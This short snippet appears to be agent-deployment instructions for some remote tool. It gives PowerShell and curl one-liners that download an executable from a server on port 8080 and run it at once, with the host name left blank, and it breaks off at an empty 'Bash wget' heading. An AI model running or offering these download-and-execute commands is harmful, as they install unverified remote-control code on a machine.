Windows

Powershell (All Versions):

(New-Object System.Net.WebClient).DownloadFile("http://:8080/get_agent/win_agent.exe", "C:/test/agent.exe"); C:/test/agent.exe -server localhost;

Powershell v3, v4 & v5 :

mkdir C:/test;Invoke-WebRequest -Uri "http://:8080/get_agent/win_agent.exe" -OutFile "C:/test/agent.exe"; C:/test/agent.exe -server localhost;

Bash cURL :

mkdir /opt/test;curl http://:8080/get_agent/lin_agent.exe -o /opt/test/agent.exe ; /opt/test/agent.exe -server localhost;

Bash wget
